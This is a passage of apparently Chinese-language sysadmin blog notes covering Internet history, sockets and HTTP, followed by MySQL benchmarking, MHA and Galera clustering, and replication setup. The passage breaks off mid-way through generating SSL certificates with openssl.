    <content type="text"><![CDATA[摘要：internet的发展，套接字socket的简介，HTTP协议，URL——- Internet And China 1969年 Internet最早来源于美国国防部高级研究计划局ARPA建立的ARPANet，1969年投入运行。1983年，ARPAnet分裂为两部分：ARPAnet和纯军事用的MILNET。当年1月，ARPA把TCP/IP协议作为ARPAnet的标准协议，这个以ARPAnet为主干网的网际互联网便被称为Internet。1986年，美国国家科学基金会建立计算机通信网络NSFnet。此后，NSFNet逐渐取代ARPANet在Internet的地位。1990年，ARPANet正式关闭.北京时间1987年9月20日，钱天白建立起一个网络节点，通过电话拨号连接到国际互联网，向他的德国朋友发出来自中国的第一封电子邮件：Across theGreat Wall we can reach every corner in the world，自此，中国与国际计算机网络开始连接在一起. 1990年10月 钱天白教授代表中国正式在国际互联网络信息中心的前身DDN-NIC注册登记了我国的顶级域名CN，并且从此开通了使用中国顶级域名CN的国际电子邮件服务。由于当时中国尚未正式连入Internet，所以委托德国卡尔斯鲁厄大学运行CN域名服务器 1993年3月2日 中国科学院高能物理研究所租用AT&amp;T公司的国际卫星信道接入美国斯坦福线性加速器中心（SLAC）的64K专线正式开通,专线开通后，美国政府以Internet上有许多科技信息和其它各种资源，不能让社会主义国家接入为由，只允许这条专线进入美国能源网而不能连接到其它地方。尽管如此，这条专线仍是我国部分连入Internet的第一根专线 1994年4月20日 中国实现与互联网的全功能连接，被国际上正式承认为有互联网的国家. 1994年5月21日 在钱天白教授和德国卡尔斯鲁厄大学的协助下，中国科学院计算机网络信息中心完成了中国国家顶级域名(CN)服务器的设置，改变了中国的CN顶级域名服务器一直放在国外的历史. 1996年1月 中国互联网全国骨干网建成并正式开通，开始提供服务. Socket概念TCP/IP协议 跨网络主机通讯 在建立通信连接的每一端，进程间的传输要有两个标志： IP地址和端口号，合称为套接字地址 socket address 客户机套接字地址定义了一个唯一的客户进程 服务器套接字地址定义了一个唯一的服务器进程 socket套接字 Socket:套接字，进程间通信IPC的一种实现，允许位于不同主机（或同一主机）上 不同进程之间进行通信和数据交换，SocketAPI出现于1983年，4.2 BSD实现 Socket API：封装了内核中所提供的socket通信相关的系统调用 Socket Domain：根据其所使用的地址 123AF_INET：Address Family，IPv4AF_INET6：IPv6AF_UNIX：同一主机上不同进程之间通信时使用 Socket Type：根据使用的传输层协议 123SOCK_STREAM：流，tcp套接字，可靠地传递、面向连接SOCK_DGRAM：数据报，udp套接字，不可靠地传递、无连接SOCK_RAW: 裸套接字,无须tcp或tdp,APP直接通过IP包通信 C/S程序套接字函数 套接字相关的系统调用：12345678socket(): 创建一个套接字bind()：绑定IP和端口listen()：监听accept()：接收请求connect()：请求连接建立write()：发送read()：接收close():关闭连接 Socket通信示例：服务器端:tcpserver.py 1234567891011121314151617181920#!/usr/bin/env pythonimport socketHOST='127.0.0.1'PORT=9527BUFFER=4096sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)sock.bind((HOST,PORT))sock.listen(3)print('tcpServer listen at: %s:%s\n\r' %(HOST,PORT))while True:client_sock,client_addr=sock.accept()print('%s:%s connect' %client_addr) while True: recv=client_sock.recv(BUFFER) if not recv: client_sock.close() break print('[Client %s:%s said]:%s' %(client_addr[0],client_addr[1],recv)) client_sock.send('tcpServer has received your message') sock.close() 客户端：tcpclient.py 1234567891011#!/usr/bin/env pythonimport socketHOST='127.0.0.1'PORT=9527BUFFER=4096sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)sock.connect((HOST,PORT))sock.send('hello, tcpServer!')recv=sock.recv(BUFFER)print('[tcpServer said]: %s' % recv)sock.close() 以普通用户运行python tcpserver.py时,对port的要求比较严格.10-1023：系统端口或特权端口(仅管理员可用) ，众所周知，永久的分配给固定的系统应用使用，22/tcp(ssh), 80/tcp(http), 443/tcp(https) HTTP通讯及术语 http: Hyper Text Transfer Protocol, 80/tcp html: Hyper Text Markup Language 超文本标记语言，编程语言 示例： 1234567891011&lt;html&gt;&lt;head&gt;&lt;title&gt;html语言&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;https://y.gtimg.cn/music/photo_new/T002R300x300M000001iSiol1uL9K3.jpg?max_age=2592000&quot; &gt;&lt;h1&gt;标题1&lt;/h1&gt;&lt;p&gt;&lt;a href=http://www.baidu.com&gt;百度一下&lt;/a&gt;欢迎&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; CSS: Cascading Style Sheet 层叠样式表。类似tempaltes的模板文件 js: javascript MIME： Multipurpose Internet Mail Extensions 多用途互联网邮件扩展 /etc/mime.types 格式：major/minor 1234567text/plaintext/htmltext/cssimage/jpegimage/pngvideo/mp4application/javascript 参考 HTTP协议介绍 http/0.9：1991 原型版本，功能简陋，只有一个命令GET。GET /index.html ,服务器只能回应HTML格式字符串，不能回应别的格式. http/1.0: 1996年5月,支持cache, MIME, method 每个TCP连接只能发送一个请求，发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接; 引入了POST命令和HEAD命令; 头信息是 ASCII 码，后面数据可为任何格式。服务器回应时会告诉客户端，数据是什么格式，Content-Type字段的作用。这些数据类型总称为MIME 多用途互联网邮件扩展，每个值包括一级类型和二级类型，预定义的类型，也可自定义类型, 常见Content-Type值：text/xml image/jpeg audio/mp3. http/1.1：1997年1月 引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection: keep-alive。对于同一个域名，大多数浏览器允许同时建立6个持久连接 引入了管道机制（pipelining），即在同一个TCP连接里，客户端可以同时发送多个请求，进一步改进了HTTP协议的效率 新增方法：PUT、PATCH、OPTIONS、DELETE 同一个TCP连接里，所有的数据通信是按次序进行的。服务器只能顺序处理回应，前面的回应慢，会有许多请求排队，造成”队头堵塞”（Head-of-line blocking） 为避免上述问题，两种方法：一是减少请求数，二是同时多开持久连接。网页优化技巧，如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等 HTTP 协议不带有状态，每次请求都必须附上所有信息。请求的很多字段都是重复的，浪费带宽，影响速度 Spdy：2009年,谷歌研发,解决 HTTP/1.1 效率不高问题 http/2.0：2015年 头信息和数据体都是二进制，称为头信息帧和数据帧复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，且不用按顺序一一对应，避免了“队头堵塞“,此双向的实时通信称为多工（Multiplexing） 引入头信息压缩机制（header compression）,头信息使用gzip或compress压缩后再发送；客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，不发送同样字段，只发送索引号，提高速度 HTTP/2 允许服务器未经请求，主动向客户端发送资源，即服务器推送（server push） URI URI: Uniform Resource Identifier 统一资源标识，分为URL和URN URN: Uniform Resource Naming，统一资源命名 示例： P2P下载使用的磁力链接是URN的一种实现 magnet:?xt=urn:btih:660557A6890EF888666 URL: Uniform Resorce Locator，统一资源定位符，用于描述某服务器某特定资源位置 两者区别：URN如同一个人的名称，而URL代表一个人的住址。换言之，URN定义某事物的身份，而URL提供查找该事物的方法。URN仅用于命名，而不指定地址 URL的组成123456789101112&lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;schame:方案，访问服务器以获取资源时要使用哪种协议user:用户，某些方案访问资源时需要的用户名password:密码，用户对应的密码，中间用：分隔Host:主机，资源宿主服务器的主机名或IP地址port:端口,资源宿主服务器正在监听的端口号，很多方案有默认端口号path:路径,服务器资源的本地名，由一个/将其与前面的URL组件分隔params:参数，指定输入的参数，参数为名/值对，多个参数，用;分隔query:查询，传递参数给程序，如数据库，用？分隔,多个查询用&amp;分隔frag:片段,一小片或一部分资源的名字，此组件在客户端使用，用#分隔###示例如下：https://list.jd.com/list.html?cat=670,671,672&amp;ev=149_2992&amp;sort=sort_totalsales15_desc&amp;trans=1]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL10]]></title>
    <url>%2Fmysql10.html</url>
    <content type="text"><![CDATA[摘要：mysql的压力测试,主要介绍Mysqlslap；生产配置文件示例 Mysqlslap​ Mysqlslap：来自于mariadb包，测试的过程默认生成一个mysqlslap的schema,生成测试表t1，查询和插入测试数据，mysqlslap库自动生成，如果已经存在则先删除。用--only-print来打印实际的测试过程，整个测试完成后不会在数据库中留下痕迹 使用格式：mysqlslap [options] 常用参数 [options] 说明：--auto-generate-sql, -a 自动生成测试表和数据，表示用mysqlslap工具自己生成的SQL脚本来测试并发压力--auto-generate-sql-load-type=type 测试语句的类型。代表要测试的环境是读操作还是写操作还是两者混合的。取值包括：read，key，write，update和mixed(默认)--auto-generate-sql-add-auto-increment 代表对生成的表自动添加auto_increment列，从5.1.18版本开始支持--number-char-cols=N, -x N 自动生成的测试表中包含多少个字符类型的列，默认1--number-int-cols=N, -y N 自动生成的测试表中包含多少个数字类型的列，默认1--number-of-queries=N 总的测试查询次数(并发客户数×每客户查询次数)--query=name,-q 使用自定义脚本执行测试，例如可以调用自定义的存储过程或者sql语句来执行测试--create-schema 代表自定义的测试库名称，测试的schema，MySQL中schema也就是database--commint=N 多少条DML后提交一次--compress, -C 如服务器和客户端都支持压缩，则压缩信息--concurrency=N, -c N 表示并发量，即模拟多少个客户端同时执行select。可指定多个值，以逗号或者–delimiter参数指定值做为分隔符如：`--concurrency=100,200,500` --engine=engine_name, -e engine_name 代表要测试的引擎，可以有多个，用分隔符隔开。例如：--engines=myisam,innodb--iterations=N, -i N 测试执行的迭代次数，代表要在不同并发环境下，各自运行测试多少次--only-print 只打印测试语句而不实际执行。--detach=N 执行N条语句后断开重连--debug-info, -T 打印内存和CPU的相关信息 单线程测试:mysqlslap -a -uroot -ppassword多线程测试:使用–concurrency来模拟并发连接1mysqlslap -a -c 100 -uroot -ppassword 迭代测试:用于需要多次执行测试得到平均值12345678mysqlslap -a -i 10 -uroot -ppasswordmysqlslap ---auto-generate-sql-add-autoincrement -amysqlslap -a --auto-generate-sql-load-type=readmysqlslap -a --auto-generate-secondary-indexes=3mysqlslap -a --auto-generate-sql-write-number=1000mysqlslap --create-schema world -q &quot;select count(*) from City”mysqlslap -a -e innodb -uroot -ppasswordmysqlslap -a --number-of-queries=10 -uroot -ppassword 测试不同的存储引擎性能1mysqlslap -a --concurrency=50,100 --number-of-queries 1000 --iterations=5 --engine=myisam,innodb --debug-info -uroot -ppassword 执行一次测试，分别50和100个并发，执行1000次总查询1mysqlslap -a --concurrency=50,100 --number-of-queries 1000 --debug-info -uroot -ppassword 50和100个并发分别得到一次测试结果(Benchmark)，并发数越多，执行完所有查询的时间越长。为了准确起见，可以多迭代测试几次.1mysqlslap -a --concurrency=50,100 --number-of-queries 1000 --iterations=5 --debug-info -uroot -ppassword 生产环境的示例 摘自于王晓春。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 硬件：内存32Ginnodb_file_per_table = 1打开独立表空间max_connections = 8000#MySQL 服务所允许的同时会话数的上限，经常出现Too Many Connections的错误提示，则需要增大此值back_log = 300#back_log 是操作系统在监听队列中所能保持的连接数max_connect_errors = 1000#每个客户端连接最大的错误允许数量，当超过该次数，MYSQL服务器将禁止此主机的连接请求，直到MYSQL服务器重启或通过flush hosts命令清空此主机的相关信息open_files_limit = 10240#所有线程所打开表的数量max_allowed_packet = 32M#每个连接传输数据大小.最大1G，须是1024的倍数，一般设为最大的BLOB的值wait_timeout = 10#指定一个请求的最大连接时间sort_buffer_size = 16M#排序缓冲被用来处理类似ORDER BY以及GROUP BY队列所引起的排序join_buffer_size = 16M#不带索引的全表扫描.使用的buffer的最小值query_cache_size = 128M#查询缓冲大小query_cache_limit = 4M#指定单个查询能够使用的缓冲区大小，缺省为1Mtransaction_isolation = REPEATABLE-READ# 设定默认的事务隔离级别thread_stack = 512K# 线程使用的堆大小. 此值限制内存中能处理的存储过程的递归深度和SQL语句复杂性，此容量的内存在每次连接时被预留.log-bin# 二进制日志功能log_long_format=row#二进制日志格式innodb_buffer_pool_size = 6G#InnoDB使用一个缓冲池来保存索引和原始数据, 可设置这个变量到服务器物理内存大小的80%innodb_file_io_threads = 4#用来同步IO操作的IO线程的数量innodb_thread_concurrency = 16#在InnoDb核心内的允许线程数量，建议的设置是CPU数量加上磁盘数量的两倍innodb_log_buffer_size = 16M# 用来缓冲日志数据的缓冲区的大小.innodb_log_file_size = 512M在日志组中每个日志文件的大小.innodb_log_files_in_group = 3# 在日志组中的文件总数innodb_lock_wait_timeout = 120# SQL语句在被回滚前,InnoDB事务等待InnoDB行锁的时间long_query_time = 2#慢查询时长log-queries-not-using-indexes#将没有使用索引的查询也记录下来]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Cluster</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL9]]></title>
    <url>%2Fmysql9.html</url>
    <content type="text"><![CDATA[摘要：MySQL的高可用，Cluster，Galera Cluster的应用。 MySQL的高可用Master HA或多主模型MMM: Multi Master MySQL，基于主从复制实现MHA： Master High Availability，对主节点进行监控，可实现自动故障转移至其它从节点；通过提升某一从节点为新的主节点，基于主从复制实现，还需要客户端配合实现，目前MHA主要支持一主多从的架构，要搭建MHA,要求一个复制集群中必须最少有三台数据库服务器，一主二从，即一台充当master，一台充当备用master，另外一台充当从库，出于机器成本的考虑，淘宝进行了改造，目前淘宝TMHA已经支持一主一从,MHA是由Prel语言编写。官网下载MHAGalera Cluster：wresp通过wresp协议在全局实现复制；任何一节点都可读写，不需要主从复制，实现多主可读可写 MHA工作原理 从宕机崩溃的master保存二进制日志事件（binlog events） 识别含有最新更新的slave 应用差异的中继日志（relay log）到其他的slave 应用从master保存的二进制日志事件（binlog events） 提升一个slave为新的master 使其他的slave连接新的master进行复制 MHA软件由两部分组成，Manager工具包和Node工具包 Manager工具包主要包括以下几个工具： masterha_check_ssh 检查MHA的SSH配置状况 masterha_check_repl 检查MySQL复制状况 masterha_manger 启动MHA masterha_check_status 检测当前MHA运行状态 masterha_master_monitor 检测master是否宕机 masterha_master_switch 故障转移（自动或手动） masterha_conf_host 添加或删除配置的server信息 Node工具包：这些工具通常由MHA Manager的脚本触发，无需人为操作）主要包括以下几个工具： save_binary_logs 保存和复制master的二进制日志 apply_diff_relay_logs 识别差异的中继日志事件并将其差异的事件应用于其他的slave filter_mysqlbinlog 去除不必要的ROLLBACK事件（MHA已不再使用此工具） purge_relay_logs 清除中继日志（不会阻塞SQL线程） 注意：为了尽可能的减少主库硬件损坏宕机造成的数据丢失，因此在配置MHA的同时建议配置成MySQL 5.5的半同步复制 实现MHA的搭建原理图如下：至少需要4台主机。 准备工作 nptdate ：保证时间同步,在/etc/ntp.conf ,加上 server 172.20.0.1 ibrust，重启服务 systemctl restart ntpd 安装包： Manager上安装mha4mysql-node-0.56-0.el6.noarch.rpm,mha4mysql-manager-0.56-0.el6.noarch.rpm，需要启用epel源下载安装依赖 其余节点：安装mha4mysql-node-0.56-0.el6.noarch.rpm selinux，iptables需要关闭. 四台主机的IP配置模拟 1234Manager:192.168.1.6master:192.168.1.7slave1:129.168.1.8slave2: 192.168.1.17 Manager主机​ 实现四台主机的基于key验证,$ip为上面四台主机的ip配置。 123ssh-genkeyssh-copy-id 192.168.1.6scp -rp .ssh $ip:/root/.ssh ​ 安装mha4mysql-node-0.56-0.el6.noarch.rpm,mha4mysql-manager-0.56-0.el6.noarch.rpm，需要启用epel源下载安装依赖文件。 12]# yum install -y mha4mysql-node-0.56-0.el6.noarch.rpm]# yum install -y mha4mysql-manager-0.56-0.el6.noarch.rpm ​ 在Manager配置MHA的配置文件/etc/mha/app1.cnf，server1中的candidate_master=1,是可能变成主服务器的键值对选项。 12345678910111213141516171819vim /etc/mha/app1.cnf[server default]user=mhauserpassword=centosmanager_workdir=/data/mha/app1/manager_log= /data/mha/app1/manager.logremote_workdir= /data/mha/app1/ssh_user=rootrepl_user=repluserrepl_password=centosping_interval=1[server1]hostname=192.168.1.7candidate_master=1[server2]hostname=192.168.1.8candidate_master=1[server3]hostname=192.168.1.17 ​ 开启集群，注意：在开启集群之前，要保证master和slave1，和slave2全部配置成主从复制架构。 12345masterha_check_ssh --conf=/etc/mha/app1.cnfmasterha_check_repl --conf=/etc/mha/app1.cnf#前台运行masterha_manager --conf=/etc/mha/app1.cnf#排错日志/data/mastermha/app1/manager.log Master主机1234567891011]# yum install -y mha4mysql-node-0.56-0.el6.noarch.rpm]# vim /etc/my.cnfserver_id=1log_binbinlog_format=rowskip_name_resolve]# systemctl restart mariadbgrant replication slave on *.* to repluser@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;show master logs;grant all on *.* to mhauser@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;show grants for mhauser@&apos;192.168.1.%&apos; slave112345678910111213141516]# yum install -y mha4mysql-node-0.56-0.el6.noarch.rpm]# vim /etc/my.cnflog_binserver_id=2read_only=1relay_log_purge=0skip_name_resolve=1]# systemctl restart mariadb]# mysqlCHANGE MASTER TO MASTER_HOST=&apos;192.168.1.7&apos;, MASTER_USER=&apos;repluser&apos;, MASTER_PASSWORD=&apos;centos&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;master-bin.000001&apos;, MASTER_LOG_POS=245;start slave; slave212345678910111213141516]# yum install -y mha4mysql-node-0.56-0.el6.noarch.rpm]# vim /etc/my.cnflog_binserver_id=3read_only=1relay_log_purge=0skip_name_resolve=1]# systemctl restart mariadb]# mysqlCHANGE MASTER TO MASTER_HOST=&apos;192.168.1.7&apos;, MASTER_USER=&apos;repluser&apos;, MASTER_PASSWORD=&apos;centos&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;master-bin.000001&apos;, MASTER_LOG_POS=245;start slave; Galera ClusterGalera Cluster：集成了Galera插件的MySQL集群，是一种新型的，数据不共享的，高度冗余的高可用方案，目前Galera Cluster有两个版本，分别是Percona Xtradb Cluster及MariaDB Cluster，Galera本身是具有多主特性的，即采用multi-master的集群架构，是一个既稳健，又在数据一致性、完整性及高性能方面有出色表现的高可用解决方案。 官方参考文档参考如下: http://galeracluster.com/documentation-webpages/galera-documentation.pdf http://galeracluster.com/documentation-webpages/index.html https://mariadb.com/kb/en/mariadb/getting-started-with-mariadb-galera-cluster/ Galera Cluster 的实现注意：安装基于Galera的mariadb-5.5.60，不能安装mariadb-server包三个节点的配置原理三个节点组成了一个集群，与普通的主从架构不同，它们都可以作为主节点，三个节点是对等的，称为multi-master架构，当有客户端要写入或者读取数据时，连接哪个实例都是一样的，读到的数据是相同的，写入某一个节点之后，集群自己会将新数据同步到其它节点上面，这种架构不共享任何数据，是一种高冗余架构。 配置过程下载安装MariaDB-Galera-server,国外yum源速度太慢，提供清华源下载。 12345678vim /etc/yum.repos.d/base.repo[mariadb]name = MariaDBbaseurl = https://mirrors.tuna.tsinghua.edu.cn/mariadb/mariadb-5.5.60/yum/centos7-amd64/gpgcheck=0]# yum install -y MariaDB-Galera-server]# rpm -ql MariaDB-Galera-server]# rpm -qf /usr/lib64/galera/libgalera_smm.so 配置文件的修改三台主机都需要修改，wsrep_provider，wsrep_cluster_address，binlog_format，主要改着三个键值对。 1234567]# vim /etc/my.cnf.d/server.cnfwsrep_provider = /usr/lib64/galera/libgalera_smm.sowsrep_cluster_address=&quot;gcomm://192.168.1.7,192.168.1.8,192.168.1.17&quot;binlog_format=row#default_storage_engine=InnoDB#innodb_autoinc_lock_mode=2#bind-address=0.0.0.0 启动相关首次启动需要添加--wsrep-new-cluster，其他节点正常启动 12345678/etc/init.d/mysql start --wsrep-new-clusterStarting MariaDB.180619 19:24:40 mysqld_safe Logging to &apos;/var/log/mariadb/mariadb.log&apos;.180619 19:24:40 mysqld_safe Starting mysqld daemon with databases from /data/mysql... SUCCESS! /etc/init.d/mysql startStarting MariaDB.180619 19:24:53 mysqld_safe Logging to &apos;/var/log/mariadb/mariadb.log&apos;.180619 19:24:53 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql...SST in progress, setting sleep higher.. SUCCESS! 测试及查询状态数据会及时同步，如果三台服务器在相同数据表的相同行同时执行增删改，则只有一台节点会成功。 12345678SHOW STATUS LIKE &apos;%wsrep%&apos;\GSHOW STATUS LIKE &apos;wsrep_cluster_size&apos;;+--------------------+-------+| Variable_name | Value |+--------------------+-------+| wsrep_cluster_size | 3 | #cluster共有3台服务器+--------------------+-------+1 row in set (0.00 sec)]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Cluster</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL8]]></title>
    <url>%2Fmysql8.html</url>
    <content type="text"><![CDATA[摘要：mysql的主从复制，级联复制，加密复制，半同步复制，cluster, Mysql复制扩展方式： Scale Up ，Scale Out MySQL的扩展 读写分离复制：每个节点都有相同的数据集向外扩展二进制日志,实现主从的主要原理单向 复制的功用： 数据分布负载均衡读备份高可用和故障切换MySQL升级测试 主从复制线程： 主节点： dump Thread：为每个Slave的I/O Thread启动一个dump线程，用于向其发送binary log events 从节点： I/O Thread：向Master请求二进制日志事件，并保存于中继日志中SQL Thread：从中继日志中读取日志事件，在本地完成重放 跟复制功能相关的文件： master.info：用于保存slave连接至master时的相关信息，例如账号、密码、服务器地址等。relay-log.info：保存在当前slave节点上已经复制的当前二进制日志和本地replay log日志的对应关系 主从复制特点： 异步复制主从数据不一致比较常见 复制架构： Master/Slave, Master/Master, 环状复制一主多从从服务器还可以再有从服务器一从多主:适用于多个不同数据库 复制需要考虑二进制日志事件记录格式 STATEMENT（5.0之前），ROW（5.1之后，推荐），MIXED 搭建主从复制主服务器修改配置文件/etc/my.cnf，启动服务，并授权slave账户同步，同时，记录二进制日志的位置 1234567891011121314]# vim /etc/my.cnf[mysqld]server_id=1log-binlog-basename=masterinnodb_file_per_table]# systemctl restart mariadb]# mysql-- 启动服务grant replication slave on *.* to repluser@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;show master status;-- master-bin.000003 399source hellodb.sqlCALL pro_testlog(); 从服务器修改配置文件/etc/my.cnf,在[mysqld]添加server_id=2,必须和主服务器不一样。修改完配置文件，重启服务即可systemctl restart mariadb 123456789101112HELP CHANGE MASTER TOCHANGE MASTER TO MASTER_HOST=&apos;192.168.1.8&apos;, MASTER_USER=&apos;repluser&apos;, MASTER_PASSWORD=&apos;centos&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;master-bin.000003&apos;, MASTER_LOG_POS=399;SHOW SLAVE STATUS\G-- 启动同步，后续会自动启动START SLAVE;SHOW SLAVE STATUS\G-- Seconds_Behind_Master: 0 这个为0，说明同步完成 报错学习做实验的时候，从服务器同步不了，还报错了。 12345show slave status\G: Slave_IO_Running: yes Slave_SQL_Running: No Last_SQL_Error: Error &apos;Duplicate entry &apos;%-test-&apos; for key &apos;PRIMARY&apos;&apos; on query. Default database: &apos;mysql&apos;. Query: &apos;INSERT INTO db SELECT * FROM tmp_db WHERE @had_db_table=0&apos; Last_Error: Error &apos;Table &apos;testlog&apos; already exists&apos; on query. Default database: &apos;hellodb&apos;. Query: &apos;create table testlog (id int auto_increment primary key,name char(10),age int default 20)&apos; 报错从日志查询,查询了一下报错，1062的报错，应该是主键冲突。 12345tail -f /var/log/mariadb/mariadb.log180614 17:36:05 [ERROR] Slave SQL: Error &apos;Table &apos;testlog&apos; already exists&apos; on query. Default database: &apos;hellodb&apos;. Query: &apos;create table testlog (id int auto_increment primary key,name char(10),age int default 20)&apos;, Error_code: 1050180614 17:46:48 [Note] Slave I/O thread: connected to master &apos;repluser@192.168.1.8:3306&apos;,replication started in log &apos;FIRST&apos; at position 4180614 17:46:48 [ERROR] Slave SQL: Error &apos;Duplicate entry &apos;%-test-&apos; for key &apos;PRIMARY&apos;&apos; on query. Default database: &apos;mysql&apos;. Query: &apos;INSERT INTO db SELECT * FROM tmp_db WHERE @had_db_table=0&apos;, Error_code: 1062180614 17:46:48 [Warning] Slave: Duplicate entry &apos;%-test-&apos; for key &apos;PRIMARY&apos; Error_code: 1062 ​ 然后查询了一下mariadb服务器的binlog_format,居然是select @@binlog_format;,STATEMENT ,心中忽然一喜，应该是这个问题，网上也查询了蛮多了资料，最后解决了这个报错如下：在主服务器上,在/etc/my.cnf将binlog_format=row，重启服务 1234567-- 确认binlog_format为rowselect @@binlog_format;FLUSH TABLES WITH READ LOCK;SHOW MASTER STATUS;-- 记录位置master-bin.000005 245 UNLOCK TABLES; ​ 在从服务器上,重新重置即可解决。 123456789STOP SLAVE;reset slave all;CHANGE MASTER TO MASTER_HOST=&apos;192.168.1.8&apos;, MASTER_USER=&apos;repluser&apos;, MASTER_PASSWORD=&apos;centos&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;master-bin.000005&apos;, MASTER_LOG_POS=245;START SLAVE; 主从复制plus：场景：从服务器的大数据备份,随着业务的增加，要求增加从服务器 主节点备份 123]# mysqldump -A -F --single-transaction --master-data=1 &gt;full.sql#将全备份文件复制到新增的从服务器上。]# scp full.sql 192.168.1.10:/backup 新增从节点的配置 配置/etc/my.cnf加入下面几行即可。然后启动服务。 tips：/etc/my.cnf,文件损坏，想恢复默认设置，yum install - y mariadb-libs 123456]# vim /etc/my.cnfserver_id=2read_onlyrelay_log=relay-log relay_log_index=relay-log.index]# systemctl start mariadb 将全备份的/backup/full.sql的change master to子句改为最初起点。然后实现sql语句全备份，并自动同步123456789101112]# vim /backup/full.sql···CHANGE MASTER TO MASTER_HOST=&apos;192.168.1.7&apos;, MASTER_USER=&apos;repluser&apos;, MASTER_PASSWORD=&apos;centos&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;master-bin.000001&apos;, MASTER_LOG_POS=245,···]# mysql &lt; /backup/full.sql配置完成 级联复制master：192.168.1.7；slave1：192.168.1.8;slave2:192.168.1.18 主节点配置1234567891011121314]# vim /etc/my.cnf[mysqld]server_id=1log-binlog-basename=masterinnodb_file_per_table]# systemctl restart mariadb]# mysql-- 启动服务grant replication slave on *.* to repluser@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;show master status;-- master-bin.000001 245source hellodb.sqlCALL pro_testlog(); slave1的配置ip为192.168.1.8，配置过程和主从复制差不多。 123456789101112131415161718]# vim /etc/my.cnfserver_id=2log_binlog_slave_updatesread_only]# systemctl restart mariadb]# mysqlCHANGE MASTER TO MASTER_HOST=&apos;192.168.1.7&apos;, MASTER_USER=&apos;repluser&apos;, MASTER_PASSWORD=&apos;centos&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;master-bin.000001&apos;, MASTER_LOG_POS=245,start slave;stop slave;-- 重置slave的日志，但是不破坏数据库reset slave all; salve2的配置ip为192.168.1.18,此时，slave2的主是slave1，故而master的ip应该为192.168.1.8 123456789101112HELP CHANGE MASTER TOCHANGE MASTER TO MASTER_HOST=&apos;192.168.1.8&apos;, MASTER_USER=&apos;repluser&apos;, MASTER_PASSWORD=&apos;centos&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;master-bin.000001&apos;, MASTER_LOG_POS=245;SHOW SLAVE STATUS\G-- 启动同步，后续会自动启动START SLAVE;SHOW SLAVE STATUS\G-- Seconds_Behind_Master: 0 这个为0，说明同步完成 半同步复制​ 默认情况下，MySQL的复制功能是异步的，异步复制可以提供最佳的性能，主库把binlog日志发送给从库即结束，并不验证从库是否接收完毕。这意味着当主服务器或从服务器端发生故障时，有可能从服务器没有接收到主服务器发送过来的binlog日志，这就会造成主服务器和从服务器的数据不一致，甚至在恢复时造成数据的丢失。 在配置好mysql主从复制后，可以安装某些插件，只要有一台从服务器同步完成，即可认为数据同步。具体如下： 在主服务器上： 1234567891011install plugin rpl_semi_sync_master soname &apos;semisync_master.so&apos;;show global variables like &apos;%semi%&apos;;+------------------------------------+-------+| Variable_name | Value |+------------------------------------+-------+| rpl_semi_sync_master_enabled | OFF || rpl_semi_sync_master_timeout | 10000 || rpl_semi_sync_master_trace_level | 32 || rpl_semi_sync_master_wait_no_slave | ON |+------------------------------------+-------+set global rpl_semi_sync_master_enabled=ON; 从服务器： 1234stop slave;install plugin rpl_semi_sync_slave soname &apos;semisync_slave.so&apos;;set global rpl_semi_sync_slave_enabled=ON;start slave; 加密复制ssh证书安装，相关的ca证书知识，源于openssl，具体原理可以参考博主前面的博文。 在默认的主从复制过程或远程连接到MySQL/MariaDB所有的链接通信中的数据都是明文的，外网里访问数据或则复制，存在安全隐患。通过SSL/TLS加密的方式进行复制的方法，来进一步提高数据的安全性 官方配置查看 主服务器开启SSL：[mysqld] 加一行ssl 主服务器配置证书和私钥；并且创建一个要求必须使用SSL连接的复制账号 从服务器使用CHANGER MASTER TO 命令时指明ssl相关选项 具体证书生成：123456789101112131415161718192021222324252627282930]# mkdir /etc/my.cnf.d/ssl/]# ls /etc/my.cnf.d/ssl/]# cd /etc/my.cnf.d/ssl/]# openssl pwd]# openssl genrsa 2048]# openssl genrsa 2048 &gt; cakey.pem#自签名证书]# openssl req -new -x509 -key cakey.pem -out cacert.pem -days 3650 Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:beijing Locality Name (eg, city) [Default City]:beijing Organization Name (eg, company) [Default Company Ltd]:mysql Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server&apos;s hostname) []:ca.mysql.com#生成master证书申请，最后的server&apos;s和自签名证书不同即可]# openssl req -newkey rsa:2048 -days 365 -nodes -keyout master.key &gt; master.csr#制作master的crt证书]# openssl x509 -req -in master.csr -CA cacert.pem -CAkey cakey.pem -set_serial 01 &gt; master.crt#生成slave证书申请，最后的server&apos;s和master证书不同即可]# openssl req -newkey rsa:2048 -days 365 -nodes -keyout salve.key &gt; slave.csr#制作slave的crt证书]# openssl x509 -req -in slave.csr -CA cacert.pem -CAkey cakey.pem -set_serial 